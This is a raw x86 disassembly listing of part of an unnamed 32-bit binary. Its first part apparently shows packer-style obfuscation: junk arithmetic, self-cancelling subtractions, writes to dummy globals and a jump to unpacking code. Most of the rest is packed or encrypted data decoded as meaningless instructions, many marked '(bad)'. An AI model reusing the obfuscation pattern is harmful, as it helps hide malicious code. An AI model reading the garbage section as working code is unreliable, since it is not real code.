  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42aa27
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42aa2b
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	(bad)  
  41950c:	fdiv   DWORD PTR [ebp-0x7ddfa267]
  419512:	or     DWORD PTR [ebp+0x60],0xffffff83
  419516:	sbb    DWORD PTR [ecx-0x4d],0x6c
  41951a:	pop    ebx
  41951b:	sub    eax,0x74ff4d03
  419520:	imul   edi,DWORD PTR [esp+ebp*8-0x2b],0x60
  419525:	(bad)  
  419526:	jp     0xba2ddfa7
  41952c:	mov    ebp,ds
  41952e:	(bad)  
  419530:	inc    edi
  419531:	hlt    
  419532:	dec    esi
  419533:	out    0xbf,al
  419535:	jae    0x4194bf
  419537:	cmp    edi,ebp
  419539:	sbb    esp,DWORD PTR [esi-0x8]
  41953c:	test   al,0x82
  41953e:	(bad)  
  41953f:	jg     0x4194fe
  419541:	test   eax,0xea3b2645
  419546:	add    ebp,DWORD PTR [ecx-0x44]
  419549:	mov    eax,ds:0x4fad7101
  41954e:	es scas al,BYTE PTR es:[edi]
  419550:	test   eax,0xb740f3ff
  419555:	adc    al,0xea
  419557:	xchg   esi,eax
  419558:	in     al,dx
  419559:	dec    edx
  41955a:	jp     0x419511
  41955c:	jne    0x4194e3
  41955e:	leave  
  41955f:	cmp    esi,DWORD PTR [ebx+ebx*1+0x28]
  419563:	cmp    eax,0xcf4ee47f
  419568:	pop    ebp
  419569:	add    ebp,DWORD PTR [eax-0x2d]
  41956c:	dec    esi
  41956d:	inc    ebp
  41956e:	es push esp
  419570:	mov    al,0xcf
  419572:	enter  0x8e04,0x41
  419576:	ret    
  419577:	repz dec esp
  419579:	xor    ch,BYTE PTR [esi]
  41957b:	sbb    al,0xe8
  41957d:	arpl   WORD PTR [ebx+0x34],bx
  419580:	inc    esi
  419581:	loope  0x4195e1
  419583:	and    ah,bl
  419585:	sub    eax,0x9b4fd154
  41958a:	mov    ss,WORD PTR [edx]
  41958c:	cwde   
  41958d:	lea    esp,[esi+ebx*2-0xd15ca98]
  419594:	outs   dx,DWORD PTR ds:[esi]
  419595:	(bad)  
  419596:	adc    BYTE PTR [edx-0x68bd7ba9],ch
  41959c:	jmp    0x104e3cca
  4195a1:	push   edx
  4195a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195a3:	dec    ecx
  4195a4:	(bad)  
  4195a5:	lods   eax,DWORD PTR ds:[esi]
  4195a6:	xchg   esi,eax
  4195a7:	mov    ah,0xc2
  4195a9:	xor    al,0x8e
  4195ab:	xor    DWORD PTR [edx+0x11f9a9],esi
  4195b1:	hlt    
  4195b2:	in     al,dx
  4195b3:	pusha  
  4195b4:	pop    es
  4195b5:	dec    esi
  4195b6:	aad    0x6c
  4195b8:	ja     0x4195ae
  4195ba:	retf   
  4195bb:	das    
  4195bc:	mov    bl,ah
  4195be:	and    esi,DWORD PTR [ecx+0x54]
  4195c1:	sbb    BYTE PTR [esi-0x5857c03e],dh
  4195c7:	push   esi
  4195c8:	jge    0x41961f
  4195ca:	dec    ebx
  4195cb:	stc    
  4195cc:	call   0x3633:0xf7c29eda
  4195d3:	int    0x3f
  4195d5:	test   DWORD PTR [ecx],eax
  4195d7:	imul   edi,DWORD PTR [eax],0xfffffff8
  4195da:	xchg   ebx,eax
  4195db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195dc:	mov    dh,0x3d
  4195de:	and    eax,0x463eef36
  4195e3:	mov    ebx,ecx
  4195e5:	lea    edi,[edx-0x5a431a04]
  4195eb:	mov    edx,0x806ade85
  4195f0:	inc    edi
  4195f1:	in     al,dx
  4195f2:	popf   
  4195f3:	fstp   QWORD PTR [eax+0x55b4b739]
  4195f9:	mov    WORD PTR [edi-0x70],ds
  4195fc:	sbb    cl,BYTE PTR [ebx]
  4195fe:	gs xchg ecx,eax
  419600:	xor    cl,BYTE PTR [ebp+0xe423b25]
  419606:	hlt    
  419607:	inc    ecx
  419608:	(bad)  
  419609:	mov    BYTE PTR [edx],ah
  41960b:	ret    0x6678
  41960e:	mov    bh,0x2
  419610:	das    
  419611:	je     0x419636
  419613:	jge    0x4195aa
  419615:	retf   0x4993
  419618:	fs scas eax,DWORD PTR es:[edi]
  41961a:	jae    0x4195b2
  41961c:	pop    eax
  41961d:	xchg   esp,eax
  41961e:	lods   al,BYTE PTR ds:[esi]
  41961f:	mov    eax,ds:0x552a9cc9
  419624:	xor    bl,0x66
  419627:	rcl    edx,cl
  419629:	xchg   edx,eax
  41962a:	cs int 0x41
  41962d:	xchg   esi,eax
  41962e:	data16 lahf 
  419630:	push   ds
  419631:	or     edx,DWORD PTR cs:[ecx+0x318304a1]
  419638:	pop    ss
  419639:	inc    eax
  41963a:	push   es
  41963b:	and    eax,0xac9cd0e9
  419640:	lahf   
  419641:	push   cs
  419642:	div    BYTE PTR ds:0xbe73d04d
  419648:	hlt    
  419649:	inc    ecx
  41964a:	shl    DWORD PTR [eax+ecx*2+0x2a],1
  41964e:	pop    edi
  41964f:	test   eax,0x34d34e1e
  419654:	xor    bl,0x22
  419657:	es iret 
  419659:	mov    al,BYTE PTR [si]
  41965c:	or     al,0xf2
  41965e:	pushf  
  41965f:	jge    0x419671
  419661:	jne    0x419656
  419663:	lds    ecx,FWORD PTR [ebx+ebp*4]
  419666:	ret    0x7af9
  419669:	aad    0xfc
  41966b:	and    bh,dh
  41966d:	mov    cl,0x2e
  41966f:	add    dl,ah
  419671:	xchg   ecx,eax
  419672:	push   esp
  419673:	loope  0x41962b
  419675:	add    BYTE PTR [ecx],dh
  419677:	mov    ebp,0x7214684c
  41967c:	inc    si
  41967e:	xor    ebx,edx
  419680:	popf   
  419681:	push   edi
  419682:	clc    
  419683:	sbb    edi,esp
  419685:	inc    edi
  419686:	xchg   DWORD PTR [eax+ebp*4-0x476f42fa],esp
  41968d:	jne    0x41968f
  41968f:	data16 fistp DWORD PTR [edi]
  419692:	sub    DWORD PTR [esi],ebp
  419694:	and    DWORD PTR [ecx-0x270ab27c],esi
  41969a:	push   cs
  41969b:	loopne 0x41961f
  41969d:	mov    es,WORD PTR [ecx+ebp*2+0x13]
  4196a1:	sbb    DWORD PTR [ecx-0x1],0xb9fb67de
  4196a8:	(bad)  
  4196a9:	or     DWORD PTR [edx-0x44],edx
  4196ac:	loopne 0x41972d
  4196ae:	nop
  4196af:	push   DWORD PTR [edi+edi*2]
  4196b2:	test   edi,edx
  4196b4:	sbb    al,0x60
  4196b6:	add    ebx,DWORD PTR [esi+0x55]
  4196b9:	nop
  4196ba:	fiadd  WORD PTR [ebp+0x11c97c8]
  4196c0:	aaa    
  4196c1:	stc    
  4196c2:	mov    WORD PTR [edx],es
  4196c4:	popf   
  4196c5:	add    DWORD PTR [ecx],eax
  4196c7:	push   esp
  4196c8:	push   cs
  4196c9:	cli    
  4196ca:	retf   0xc425
  4196cd:	leave  
  4196ce:	mov    ch,0x17
  4196d0:	jl     0x419748
  4196d2:	ja     0x419704
  4196d4:	mov    ecx,0x9c43ef03
  4196d9:	cs jl  0x41971b
  4196dc:	mov    al,ds:0x94b83a9f
  4196e1:	fs mov esp,0x7d84b50d
  4196e7:	(bad)  [ecx+ecx*1+0x77]
  4196eb:	xor    esi,DWORD PTR [ebx-0x7c6ebddd]
  4196f1:	add    BYTE PTR [ecx+0x31],dl
  4196f4:	mov    cl,0x1e
  4196f6:	test   DWORD PTR [ecx],0xf7dc6747
  4196fc:	into   
  4196fd:	hlt    
  4196fe:	mov    ebp,esi
  419700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419701:	cmp    edx,DWORD PTR [ecx]
  419703:	mov    esi,0xa5cf3929
  419708:	adc    BYTE PTR [eax+0xed56398],ch
  41970e:	mov    BYTE PTR [edx+eiz*8+0x32],al
  419712:	xor    al,0xda
  419714:	lahf   
  419715:	icebp  
  419716:	cwde   
  419717:	sub    eax,0x88f65980
  41971c:	popa   
  41971d:	ret    0x2bc7
  419720:	inc    esp
  419721:	ss cwde 
  419723:	clc    
  419724:	imul   ebp,DWORD PTR [edi+edi*4-0x7eed9c48],0xffffffba
  41972c:	or     al,0x5f
  41972e:	cmp    dh,BYTE PTR [edi+0xc]
  419731:	xchg   BYTE PTR [ebx-0x45660b46],ah
  419737:	pop    ebx
  419738:	popf   
  419739:	sar    bl,1
  41973b:	addr16 and al,0x5b
  41973e:	iret   
  41973f:	xchg   edx,eax
  419740:	xchg   esi,eax
  419741:	mov    bh,0xb8
  419743:	push   cs
  419744:	ins    BYTE PTR es:[edi],dx
  419745:	push   ebx
  419746:	jbe    0x4196d1
  419748:	dec    esp
  419749:	or     esi,DWORD PTR [eax]
  41974b:	repnz xchg esp,eax
  41974d:	fcmovb st,st(4)
  41974f:	xchg   ecx,eax
  419750:	imul   eax,DWORD PTR [edi],0x19
  419753:	mov    dl,0x23
  419755:	dec    edx
  419756:	rol    DWORD PTR [ecx],cl
  419758:	clc    
  419759:	sub    DWORD PTR [ecx+0x5c],0xdcb19331
  419760:	je     0x4197d0
  419762:	push   esi
  419763:	dec    edx
  419764:	ja     0x41977a
  419766:	es sbb eax,0xb0878a12
  41976c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41976d:	inc    ecx
  41976e:	jp     0x4197cd
  419770:	clc    
  419771:	xlat   BYTE PTR ds:[ebx]
  419772:	das    
  419773:	or     dh,dh
  419775:	sub    BYTE PTR [esi+0x41c526e9],bh
  41977b:	inc    edi
  41977c:	lods   eax,DWORD PTR ds:[esi]
  41977d:	xor    al,0x62
  41977f:	call   0x9d9b:0x97cf956f
  419786:	test   al,0xb8
  419788:	push   DWORD PTR [eax]
  41978a:	fidiv  WORD PTR ds:0xb579d5fb
  419790:	adc    eax,0x38e4b28
  419795:	sbb    cl,0x2
  419798:	pop    es
  419799:	lods   eax,DWORD PTR ds:[esi]
  41979a:	div    DWORD PTR [edi-0x75bf8fc1]
  4197a0:	outs   dx,BYTE PTR ds:[esi]
  4197a1:	arpl   WORD PTR [eax+0x1cc18f40],di
  4197a7:	cmp    DWORD PTR [ebx-0xef354b2],eax
  4197ad:	jmp    0x568244e9
  4197b2:	dec    ecx
  4197b3:	cmc    
  4197b4:	fld    DWORD PTR [edi]
  4197b6:	push   edx
  4197b7:	sub    al,BYTE PTR [ebp+0x72]
  4197ba:	in     al,dx
  4197bb:	aad    0x51
  4197bd:	or     DWORD PTR [ecx],0xb1333dc8
  4197c3:	shl    BYTE PTR ds:[esi+0x66],0x31
  4197c8:	js     0x4197f0
  4197ca:	inc    esp
  4197cb:	(bad)  
  4197cc:	mov    eax,0x91d5ff19
  4197d1:	fcomp  DWORD PTR [edi-0xd891932]
  4197d7:	retf   
  4197d8:	jmp    0xa19b:0xf8dbb613
  4197df:	ds sub al,0xe3
  4197e2:	mov    edx,0x588adf42
  4197e7:	ret    
  4197e8:	and    ebx,ebp
  4197ea:	sbb    DWORD PTR [edi],ebx
  4197ec:	pop    esi
  4197ed:	jae    0x41986b
  4197ef:	xor    DWORD PTR ss:[esi-0x4e],ecx
  4197f3:	or     dl,bh
  4197f5:	jmp    0x419782
  4197f7:	mov    eax,ds:0xb2c9d4c6
  4197fc:	stos   DWORD PTR es:[edi],eax
  4197fd:	int    0xd8
  4197ff:	push   edx
  419800:	ds and eax,ebp
  419803:	cdq    
  419804:	pop    ecx
  419805:	cmp    ecx,DWORD PTR [esi+0x53ae7b14]
  41980b:	push   esi
  41980c:	fdivr  QWORD PTR [ebx+eiz*4+0x59]
  419810:	outs   dx,DWORD PTR ds:[esi]
  419811:	dec    eax
  419812:	xor    DWORD PTR [edx+ecx*4-0x52],eax
  419816:	push   cs
  419817:	mov    dl,0x5a
  419819:	test   DWORD PTR [edi],ebx
  41981b:	push   ebx
  41981c:	sbb    eax,ebp
  41981e:	or     al,0x99
  419820:	(bad)  
  419821:	jo     0x41988c
  419823:	dec    ebp
  419824:	or     BYTE PTR ds:0x554343f7,bh
  41982a:	shl    cl,0x12
  41982d:	sub    al,0x51
  41982f:	loop   0x4197b7
  419831:	add    edi,DWORD PTR [ebx+0x1a]
  419834:	call   0xde485a83
  419839:	sbb    BYTE PTR [edx+0x41],bh
  41983c:	in     eax,dx
  41983d:	sub    esi,0xffffff9d
  419840:	or     eax,DWORD PTR [ebp+0x58]
  419843:	sub    eax,0x53824b67
  419848:	dec    edi
  419849:	ins    BYTE PTR es:[edi],dx
  41984a:	mov    eax,ds:0xa4f02659
  41984f:	cmc    
  419850:	jnp    0x41988a
  419852:	xor    DWORD PTR [edx],ebp
  419854:	dec    BYTE PTR [edi+ebp*1+0x7e]
  419858:	inc    edx
  419859:	push   ss
  41985a:	adc    eax,0xf7631e37
  41985f:	into   
  419860:	repnz stos DWORD PTR es:[edi],eax
  419862:	fisub  DWORD PTR [ebx+0x2e]
  419865:	(bad)
  419868:	sub    BYTE PTR [edx-0x6486831e],0x8c
  41986f:	or     eax,0x936d9f1f
  419874:	or     cl,ch
  419876:	mov    esi,DWORD PTR [esi+0x58d6e23d]
  41987c:	push   0xffffffd8
  41987e:	in     al,dx
  41987f:	jns    0x41988b
  419881:	inc    ebp
  419882:	rol    BYTE PTR [esi+eiz*2+0x22],1
  419886:	rcl    BYTE PTR [esp+ebx*4-0x51],1
  41988a:	dec    edx
  41988b:	fstp   QWORD PTR [esi-0x69]
  41988e:	outs   dx,DWORD PTR ds:[esi]
  41988f:	call   0x9b81f64f
  419894:	stos   DWORD PTR es:[edi],eax
  419895:	mov    edx,eax
  419897:	add    eax,0x6461a1a
  41989c:	cs xchg ebp,eax
  41989e:	bound  esi,QWORD PTR [esi-0x59b881cf]
  4198a4:	cli    
  4198a5:	ror    BYTE PTR [ebx],cl
  4198a7:	rcr    bl,1
  4198a9:	jnp    0x4198ad
  4198ab:	(bad)  
  4198ac:	push   0xffffffb4
  4198ae:	outs   dx,DWORD PTR ds:[esi]
  4198af:	sbb    dl,BYTE PTR [eax+eax*4-0xc]
  4198b3:	jmp    0xa6eb:0x2ab9d66d
  4198ba:	xchg   edi,eax
  4198bb:	sar    dl,1
  4198bd:	mov    ebp,0xdd41b05d
  4198c2:	sbb    bl,0x9e
  4198c5:	xchg   ax,ax
  4198c7:	adc    bh,BYTE PTR [edx]
  4198c9:	sbb    eax,esp
  4198cb:	adc    cl,ah
  4198cd:	sub    eax,edi
  4198cf:	add    al,0x16
  4198d1:	jmp    0xd0ad:0xc50193ff
  4198d8:	mov    dh,0x55
  4198da:	xchg   esp,eax
  4198db:	mov    edx,0x74ac1a13
  4198e0:	lock mov ds:0x9de74f24,eax
  4198e6:	push   ecx
  4198e7:	push   cs
  4198e8:	dec    esi
  4198e9:	mov    ds:0x3450051a,eax
  4198ee:	aaa    
  4198ef:	inc    ebp
  4198f0:	nop
  4198f1:	es sbb al,0x4e
  4198f4:	enter  0xf7cb,0x2e
  4198f8:	jecxz  0x419943
  4198fa:	loop   0x41991f
  4198fc:	push   eax
  4198fd:	mov    edi,0x8bb853e
  419902:	xor    BYTE PTR [esi+eiz*8-0x11],ah
  419906:	ins    DWORD PTR es:[edi],dx
  419907:	cmp    esp,ebx
  419909:	mov    esi,0x93b02dbd
  41990e:	cmp    DWORD PTR [edi+0x55a38f91],edx
  419914:	pop    ds
  419915:	test   eax,0x78560a95
  41991a:	in     al,dx
  41991b:	cdq    
  41991c:	lock mov cl,0x72
  41991f:	dec    ebp
  419920:	retf   0xaa94
  419923:	lock inc ecx
  419925:	or     al,0x8a
  419927:	cmp    ecx,DWORD PTR [edx+0x48e1cbf7]
  41992d:	daa    
  41992e:	rol    DWORD PTR [esi+0xff30fec],0x34
  419935:	ds (bad) 
  419937:	fidivr WORD PTR [ebp+0x4a71670c]
  41993d:	(bad)  
  41993e:	mov    ch,0x3f
  419940:	xchg   edx,eax
  419941:	and    eax,0x870a2335
  419946:	scas   eax,DWORD PTR es:[edi]
  419947:	or     edx,DWORD PTR [edi]
  419949:	mov    BYTE PTR ds:0xb8de3f17,dh
  41994f:	mov    dl,BYTE PTR [ebx]
  419951:	cs mov edx,0xde47e636
  419957:	cmp    al,0xae
  419959:	jb     0x419978
  41995b:	ss push 0xffffffab
  41995e:	pop    ds
  41995f:	mov    al,ds:0x22557130
  419964:	sub    esi,DWORD PTR [esi-0x1b7ba2a0]
  41996a:	fdivr  st(5),st
  41996c:	sahf   
  41996d:	cmp    al,0x56
  41996f:	js     0x419913
  419971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419972:	dec    esi
  419973:	mov    al,0xe6
  419975:	pop    esi
  419976:	mov    BYTE PTR [edi+0x48],0x4b
  41997a:	push   ss
  41997b:	xlat   BYTE PTR ds:[ebx]
  41997c:	out    dx,al
  41997d:	enter  0x9ffe,0x5f
  419981:	clc    
  419982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419983:	imul   esp,DWORD PTR [esi+eax*4-0x6d],0x5e
  419988:	addr16 (bad) 
  41998a:	xlat   BYTE PTR ds:[ebx]
  41998b:	inc    ebx
  41998c:	test   al,0xf5
  41998e:	mov    ds:0x5144987,eax
  419993:	and    eax,0xb8b34a87
  419998:	sub    esi,DWORD PTR [ebx]
  41999a:	cmp    BYTE PTR ds:0xa67a3c85,0x46
  4199a1:	or     eax,eax
  4199a3:	mov    edx,0x7bcd52ea
  4199a8:	pop    ds
  4199a9:	jmp    0x4199bb
  4199ab:	(bad)  
  4199ac:	mov    eax,0x9e1a3cfe
  4199b1:	imul   edx,DWORD PTR [eax-0x28],0x856b4c68
  4199b8:	(bad)  
  4199b9:	js     0x419a0c
  4199bb:	push   0x965fe9d5
  4199c0:	dec    eax
  4199c1:	mov    dh,0xbf
  4199c3:	pop    ebx
  4199c4:	cld    
  4199c5:	lahf   
  4199c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199c7:	adc    BYTE PTR [ebx],bl
  4199c9:	adc    ecx,ebx
  4199cb:	adc    eax,0xe7d6a8af
  4199d0:	sahf   
  4199d1:	pop    esp
  4199d2:	repnz pop edx
  4199d4:	adc    edx,DWORD PTR [si+0x58]
  4199d8:	addr16 jnp 0x4199e9
  4199db:	int3   
  4199dc:	pusha  
  4199dd:	adc    bh,BYTE PTR fs:[ebp-0x7c8f6545]
  4199e4:	push   cs
  4199e5:	cmp    al,0xd2
  4199e7:	xchg   DWORD PTR [ecx],eax
  4199e9:	jecxz  0x419987
  4199eb:	mov    dh,0xd7
  4199ed:	inc    ebx
  4199ee:	mov    ebx,0x41fcf2e3
  4199f3:	push   edi
  4199f4:	add    edx,DWORD PTR [edx]
  4199f6:	jle    0x419a4a
  4199f8:	pop    esp
  4199f9:	and    cl,BYTE PTR [ebp+0x56]
  4199fc:	cli    
  4199fd:	repz adc ebx,DWORD PTR [edx+edx*1+0x69764e4f]
  419a05:	or     eax,0xe2ff67ce
  419a0a:	or     edx,ecx
  419a0c:	aaa    
  419a0d:	repz out 0x82,eax
  419a10:	adc    BYTE PTR [eax-0x4e70c6b4],bl
  419a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a17:	inc    ebx
  419a18:	jb     0x419a27
  419a1a:	ret    0xd376
  419a1d:	mov    DWORD PTR [esi+0x1f],0x7d8f16
  419a24:	sti    
  419a25:	(bad)  
  419a26:	les    ecx,FWORD PTR [edx]
  419a28:	mov    ebp,0xe3d288d7
  419a2d:	add    eax,DWORD PTR [edi-0x4cfdc3cb]
  419a33:	es mov al,0xd4
  419a36:	data16 and ah,al
  419a39:	mov    ah,0xfd
  419a3b:	dec    esi
  419a3c:	lea    edi,[eax]
  419a3e:	adc    DWORD PTR [eax-0x6f],0x63589e1d
  419a45:	jb     0x419a74
  419a47:	mov    ebp,0x863ae128
  419a4c:	cdq    
  419a4d:	test   al,0x84
  419a4f:	inc    ebp
  419a50:	xchg   edx,eax
  419a51:	psllw  mm0,QWORD PTR gs:[edi-0x65]
  419a56:	icebp  
  419a57:	and    al,0x36
  419a59:	call   0x1590:0x8e914b70
  419a60:	and    ah,cl
  419a62:	pushf  
  419a63:	cmp    BYTE PTR ds:0xbf3e9935,dl
  419a69:	and    DWORD PTR [eax+0x80f718c],0x4b
  419a70:	cli    
  419a71:	jmp    0x2e38129f
  419a76:	mov    edi,0xb13ebd6b
  419a7b:	sbb    al,0x28
  419a7d:	inc    ebp
  419a7e:	ins    BYTE PTR es:[edi],dx
  419a7f:	mov    ch,0x57
  419a81:	(bad)  
  419a82:	sti    
  419a83:	or     ebx,esi
  419a85:	ins    DWORD PTR es:[edi],dx
  419a86:	icebp  
  419a87:	shl    BYTE PTR [eax-0x35],1
  419a8a:	mov    esi,0x94f2fb7d
  419a8f:	retf   0x3e1b
  419a92:	(bad)  
  419a94:	add    BYTE PTR [edx+ebx*4-0xa],dh
  419a98:	mov    eax,0x56ea5076
  419a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a9e:	inc    edi
  419a9f:	dec    eax
  419aa0:	xor    DWORD PTR [edx-0x75],ecx
  419aa3:	push   esi
  419aa4:	cs ja  0x419a38
  419aa7:	or     DWORD PTR [edx-0x41f4df41],esp
  419aad:	adc    ecx,ecx
  419aaf:	outs   dx,BYTE PTR ds:[esi]
  419ab0:	mov    ds:0x7e3bc2ec,eax
  419ab5:	int    0xd2
  419ab7:	inc    edx
  419ab8:	mov    WORD PTR cs:[ebx],ds
  419abb:	scas   eax,DWORD PTR es:[edi]
  419abc:	cmp    ecx,DWORD PTR [ebx-0x3080108]
  419ac2:	sub    eax,0xc436d5a4
  419ac7:	pop    edi
  419ac8:	out    0xc4,al
  419aca:	ja     0x419abe
  419acc:	or     esi,DWORD PTR [esi-0x6e7257ca]
  419ad2:	in     al,dx
  419ad3:	fstp   TBYTE PTR [ecx+0x40a45c3c]
  419ad9:	js     0x419b2a
  419adb:	sub    al,0x43
  419add:	xchg   edi,eax
  419ade:	and    al,0x2c
  419ae0:	xor    ch,BYTE PTR [edi-0x59ae9af1]
  419ae6:	fmulp  st(5),st
  419ae8:	mov    eax,esi
  419aea:	test   eax,0x7b2f5a33
  419aef:	rol    DWORD PTR [edx-0x183c69f2],1
  419af5:	inc    ebx
  419af6:	jmp    0x6763839
  419afb:	push   cs
  419afc:	pop    ds
  419afd:	out    dx,al
  419afe:	arpl   WORD PTR [eax-0x689500b0],cx
  419b04:	into   
  419b05:	inc    ebx
  419b06:	add    DWORD PTR [edi+0x12df3e4a],esp
  419b0c:	mov    ebp,0xb2d252c8
  419b11:	inc    esp
  419b12:	mov    dl,0x4
  419b14:	xor    bh,BYTE PTR [eax+0x21]
  419b17:	(bad)  
  419b18:	dec    ebx
  419b19:	mov    WORD PTR [edi-0x1f],gs
  419b1c:	xchg   edi,eax
  419b1d:	or     bl,ch
  419b1f:	push   edi
  419b20:	sub    esi,eax
  419b22:	(bad)
  419b25:	xchg   edi,eax
  419b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b27:	mul    BYTE PTR [edx+ebp*1-0x4cd141be]
  419b2e:	and    eax,0xa37ccaa5
  419b33:	test   BYTE PTR [esi+eiz*1],ah
  419b36:	lds    esp,FWORD PTR [esp+edi*8+0x5bb010fb]
  419b3d:	sbb    eax,esp
  419b3f:	loopne 0x419b1d
  419b41:	icebp  
  419b42:	scas   eax,DWORD PTR es:[edi]
  419b43:	lods   eax,DWORD PTR ds:[esi]
  419b44:	fdivr  st,st(3)
  419b46:	loopne 0x419b1b
  419b48:	and    al,0xd3
  419b4a:	in     eax,0x3c
  419b4c:	repnz adc eax,eax
  419b4f:	inc    ebp
  419b50:	mov    ebx,0x4024de55
  419b55:	int    0x6c
  419b57:	pop    esi
  419b58:	idiv   DWORD PTR [eax-0x5f938ca2]
  419b5e:	dec    dh
  419b60:	pushf  
  419b61:	sub    DWORD PTR [ecx-0x99186c],ebx
  419b67:	es push ebx
  419b69:	push   edx
  419b6a:	cli    
  419b6b:	mov    ch,BYTE PTR [ebx]
  419b6d:	jg     0x419b52
  419b6f:	das    
  419b70:	xchg   ebx,eax
  419b71:	addr16 repnz fs xor cl,cl
  419b76:	dec    ebp
  419b77:	mov    eax,0x75340acc
  419b7c:	stc    
  419b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b7e:	pop    edi
  419b7f:	pop    edx
  419b80:	dec    ebp
  419b81:	jae    0x419be6
  419b83:	test   edx,0x51c0036b
  419b89:	cli    
  419b8a:	sub    al,0xef
  419b8c:	mov    dl,BYTE PTR [ecx+eax*8-0x4eabba3c]
  419b93:	pop    ecx
  419b94:	mov    DWORD PTR [ecx-0x3daea831],ebp
  419b9a:	cmp    eax,0x387b3fbe
  419b9f:	sub    al,0x65
  419ba1:	mov    cl,0x66
  419ba3:	jnp    0x419b87
  419ba5:	loopne 0x419b2e
  419ba7:	adc    esp,DWORD PTR [eax-0x4d6835af]
  419bad:	std    
  419bae:	nop
  419baf:	stc    
  419bb0:	outs   dx,DWORD PTR ds:[esi]
  419bb1:	inc    ecx
  419bb2:	pop    edi
  419bb3:	cli    
  419bb4:	sub    dl,BYTE PTR [edi]
  419bb6:	mov    dh,0xdb
  419bb8:	in     eax,0x54
  419bba:	stos   BYTE PTR es:[edi],al
  419bbb:	cmp    DWORD PTR [ebx+esi*2+0x193c30ce],edx
  419bc2:	les    edx,FWORD PTR [eax-0x7b]
  419bc5:	mov    esi,0x15c92a96
  419bca:	xor    BYTE PTR [edx],ah
  419bcc:	jb     0x419c1b
  419bce:	retf   
  419bcf:	xor    eax,0x5004f6ed
  419bd4:	sbb    DWORD PTR [ecx],esp
  419bd6:	loope  0x419bb4
  419bd8:	mov    bh,0x6d
  419bda:	xchg   edx,eax
  419bdb:	out    0x61,eax
  419bdd:	call   0xf0ddcbb7
  419be2:	imul   ecx,DWORD PTR [eax-0x4f6d3ebd],0x9a708f38
